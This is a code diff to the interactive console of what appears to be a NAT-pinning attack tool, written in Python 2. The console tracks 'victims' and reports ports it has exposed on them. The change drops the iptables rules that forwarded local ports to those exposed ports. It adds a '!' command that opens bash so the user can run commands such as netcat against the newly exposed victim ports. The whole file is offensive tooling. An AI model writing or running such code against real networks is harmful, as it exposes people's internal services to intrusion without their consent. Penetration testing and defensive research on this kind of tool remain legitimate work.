@@ -11,6 +11,7 @@ import sys
 import asyncore
 import thread
 import readline
+import socket
 from datetime import datetime
 from subprocess import call
 
@@ -50,10 +51,11 @@ class Shell():
 			print "   \t\tType help list for more information."
 			print "   test\t\tTest natpinning. Command format: test id PROTO IP PORT"
 			print "   \t\tType help test for more information."
-			print "   exploit\tExploit natpinning. Command format: exploit id PROTO IP PORT LOCALPORT"
-			print "  \t\tThis is the fun stuff, type 'help exploit' for more information."
-			print "  exit\t\tQuits the application."
-			print "  quit\t\tQuits the application."
+			print "   !\t\tDrop to shell, usefull to quickly run any command on newly exposed ports (like netcat)"
+			print "   \t\tThis is the fun stuff, type 'help exploit' for more information."
+			print "   clear\t\t Clears the screen."
+			print "   exit\t\tQuits the application."
+			print "   quit\t\tQuits the application."
 		elif len(parts)==2:
 			if parts[1].upper()=="TEST":
 				print ""
@@ -104,7 +106,7 @@ class Shell():
 			print "----------------------------------------------------------------------"
 			for connector in self.ENGINE.CONNECTORS:
 				data = connector.split("|")
-				print data[0] + "\t" + str(data[1]) + "\t" + str(data[2])
+				print data[0] + "\t\t" + str(data[1]) + "\t\t" + str(data[2])
 		else:
 			print "Invalid list item specified, allowed values are: victims, services,connectors"
 	def getUserInput(self):
@@ -128,8 +130,13 @@ class Shell():
 			self.handleCmd_test(parts)
 		elif parts[0].upper()=="HELP" or parts[0]=="?":
 			self.handleCMD_help(parts)
+		elif parts[0]=="!":
+			call(["bash"])
+		elif parts[0].upper()=="CLEAR":
+			call(["clear"])
 	#end def
 #end class
+
 class Engine():
 	VERBOSITY = 2
 	LOGTYPE = "screen"
@@ -153,24 +160,21 @@ class Engine():
 			print "NATPIN FAILED : received private IP " + host
 		else:
 			print "NATPIN SUCCES : victim exposed port " + str(port) + " on IP " + host
-			self.addConnector(host,port)
+			self.addConnector(host,str(port))
 	#end def
 	def addConnector(self,ip,port):
 		global CONNECTORS
 		exists = False
-		localport = 65000
 		for connector in self.CONNECTORS:
 			data = connector.split("|")
 			if data[0] == ip and str(data[1])==str(port):
 				exists = True
-			localport = int(data[3])
 		if exists == False:
-			localport = localport + 1 #next free port
-			#adding rule to iptables
-			call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "TCP", "--dport", str(localport),"-j", "DNAT","--to-destination", ip+":"+str(port) ])
-			self.log("Created new iptables rule, local port " + str(localport) + " is now forwarded to " + host + ":" + str(port))
-			self.CONNECTORS.append(ip + "|" + str(port) + "|" + str(datetime.datetime.now().time())+ "|" + str(localport))
+			self.CONNECTORS.append(ip + "|" + str(port) + "|" + str(datetime.now().time()))
 	#end def
+	def delConnectors(self):
+		#removes all created iptables rules
+		self.CONNECTORS = []
 	def runServers(self,runCMD,runWeb, runFlash, proto="ALL"):
 		global SERVERS, SERVICE_THREAD
 		if runCMD == True: self.SERVERS.append(cmd.Server(proto="TCP",serverPort=60003,caller=self))
@@ -192,6 +196,7 @@ class Engine():
 		global SERVICE_THREAD
 		for server in self.SERVERS:
 			server.stop()
+		self.delConnectors()
 		self.SERVICE_THREAD = None
 	#end def
 #end class
